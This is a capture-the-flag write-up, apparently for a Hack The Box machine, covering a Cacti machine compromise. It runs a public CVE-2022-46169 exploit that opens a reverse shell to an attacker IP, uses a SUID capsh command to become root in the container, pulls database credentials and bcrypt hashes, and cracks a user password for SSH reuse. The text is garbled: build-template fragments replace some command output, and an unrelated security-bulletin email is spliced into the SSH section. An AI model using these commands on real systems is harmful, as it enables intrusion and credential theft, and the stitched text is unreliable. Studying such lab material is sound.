<!-- Upon searching the documentation for default passwords didn't find anything. Although a post on the [forum](https://forums.cacti.net/viewtopic.php?t=60897) mentioned `admin:admin` and those credentials work

![Post-login-dash](./images/Post-login-dash.png) -->

Cacti version 1.2.22 is vulnerable to [CVE-2022-46169](https://www.sonarsource.com/blog/cacti-unauthenticated-remote-code-execution/), which allows unauthenticated users to execute arbitrary commands with the same privileges as the web server process. This vulnerability comprises two issues: an authentication bypass in `remote.php` and a command injection due to the `poller_id` parameter used with [proc_open()](https://www.php.net/manual/en/function.proc-open.php).

Found a [PoC for the CVE](https://github.com/ariyaadinatha/cacti-cve-2022-46169-exploit) on GitHub, which includes a built-in feature to spawn a reverse shell.

```bash
> python cacti.py
Enter the target address (like 'http://123.123.123.123:8080')   http://10.10.11.211/
Checking vulnerability...
App is vulnerable
Brute forcing id...
Enter your IPv4 addressed  10.10.14.75
Enter the port you want to listen on   9005
Delivering payload...
```

Once the vulnerability in Cacti is exploited, I get a shell as the user `www-data` since Cacti is run as www-data.

```bash
> pc -lp 9005

```

There's also a metasploit module available for this CVE, `exploit/linux/http/cacti_unauthenticated_cmd_injection`

## Privilege Escalation

---

### Container root escalation

It seems Cacti is being hosted in a Docker container.

-   The presence of a `.dockerenv` file and an `entrypoint.sh` script in the root directory.
-   The IP address is of the format 172.x.x.x
-   The hostname resembles a container ID, which is a common naming convention in Docker environments.
-   It is a restricted environment, basic commands like ip or ifconfig are not available

{{< /highlight >}}

The container doesn't have `sudo`, but it does have a few binaries with the SUID bit set and owned by root.

{{< /highlight >}}

The `capsh` binary is uncommon. Using the exploit from [GTFObins](https://gtfobins.github.io/gtfobins/capsh/), can escalate to root within the container.

Normally, processes have the same real-uid (the UID of the user executing the binary) and effective-uid (the UID of the owner). However, in the case of binaries with the SUID bit set, the effective-uid is changed to the file's owner, while the real-uid remains the same, essentially granting the processes escalated privileges.

```bash
(remote) www-data@50bca5e748b0:/$ capsh --gid=0 --uid=0 --
root@50bca5e748b0:/# id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
root@50bca5e748b0:/#
```

The `entrypoint.sh` file is executed during the container startup and is accessible only to the root user. It can provide valuable information about the container's configuration and initialization process.

```bash
(remote) www-data@50bca5e748b0:/$ ls -la entrypoint.sh
-rw-r--r--   1 root root    648 Jan  5 11:37 entrypoint.sh
(remote) root@50bca5e748b0:/# cat entrypoint.sh
#!/bin/bash
set -ex

wait-for-it db:3306 -t 300 -- echo "database is connected"
if [[ ! $(mysql --host=db --user=root --password=root cacti -e "show tables") =~ "automation_devices" ]]; then
    mysql --host=db --user=root --password=root cacti < /var/www/html/cacti.sql
    mysql --host=db --user=root --password=root cacti -e "UPDATE user_auth SET must_change_password='' WHERE username = 'admin'"
    mysql --host=db --user=root --password=root cacti -e "SET GLOBAL time_zone = 'UTC'"
fi

# first arg is `-f` or `--some-option`
if [ "${1#-}" != "$1" ]; then
    set -- apache2-foreground "$@"
fi

exec "$@"
```

The `entrypoint.sh` script executes several MySQL commands, which use the credentials `root:root` to access the MariaDB database. With these credentials, it is possible to log into the database and extract the password hashes from the `user_auth` table. The database consists of multiple tables, but the `user_auth` table is particularly interesting as it contains usernames and corresponding passwords.

```bash
MySQL [cacti]> describe user_auth;
+------------------------+-----------------------+------+-----+---------+----------------+
| Field                  | Type                  | Null | Key | Default | Extra          |
+------------------------+-----------------------+------+-----+---------+----------------+
| id                     | mediumint(8) unsigned | NO   | PRI | NULL    | auto_increment |
| username               | varchar(50)           | NO   | MUL | 0       |                |
| password               | varchar(256)          | NO   |     |         |                |
...snip...
...snip...
```

The `user_auth` table contains password hashes for a new user named Marcus.

```bash
MySQL [cacti]> select id,username,password from user_auth;
+----+----------+--------------------------------------------------------------+
| id | username | password                                                     |
+----+----------+--------------------------------------------------------------+

|  3 | guest    | 43e9a4ab75570f5b                                             |

+----+----------+--------------------------------------------------------------+

```

The password hash for marcus can be cracked using JTR and the `rockyou` wordlist ‚Üí `marcus:funkymonkey`.

```bash
> john hashes --format=bcrypt --show
marcus:funkymonkey
```

Testing for password reuse, the credentials are reused on SSH.

```bash
> pc marcus:funkymonkey@10.10.11.211

Subject: Security Bulletin - Three Vulnerabilities to be Aware Of

Dear all,

We would like to bring to your attention three vulnerabilities that have been recently discovered and should be addressed as soon as possible.

CVE-2021-33033: This vulnerability affects the Linux kernel before 5.11.14 and is related to the CIPSO and CALIPSO refcounting for the DOI definitions. Attackers can exploit this use-after-free issue to write arbitrary values. Please update your kernel to version 5.11.14 or later to address this vulnerability.

CVE-2020-25706: This cross-site scripting (XSS) vulnerability affects Cacti 1.2.13 and occurs due to improper escaping of error messages during template import previews in the xml_path field. This could allow an attacker to inject malicious code into the webpage, potentially resulting in the theft of sensitive data or session hijacking. Please upgrade to Cacti version 1.2.14 or later to address this vulnerability.

CVE-2021-41091: This vulnerability affects Moby, an open-source project created by Docker for software containerization. Attackers could exploit this vulnerability by traversing directory contents and executing programs on the data directory with insufficiently restricted permissions. The bug has been fixed in Moby (Docker Engine) version 20.10.9, and users should update to this version as soon as possible. Please note that running containers should be stopped and restarted for the permissions to be fixed.

We encourage you to take the necessary steps to address these vulnerabilities promptly to avoid any potential security breaches. If you have any questions or concerns, please do not hesitate to contact our IT department.

Best regards,

[CVE-2021-41091](https://security.snyk.io/vuln/SNYK-SLES150-DOCKER-2661076) is a vulnerability in the Docker engine (v20.10.9) that allows unprivileged users to execute programs with incorrect permissions within the container. This vulnerability occurs when the UID of the user on the host matches the UID of the file owner within the container.

Found a [PoC](https://github.com/UncleJ4ck/CVE-2021-41091) for the CVE on GitHub. To get root privileges it's necessary to set the `SUID` bit on `/bin/bash` before executing the exploit script.

> [!tip] Remember
> Need to set the SUID bit on the docker container before executing the exploit

Running the exploit script tells us that the `/var/lib/docker/overlay2/c41d5854e....a372cb2f1/merged` is vulnerable to CVE-2021-41091, but it doesn't give a root shell.
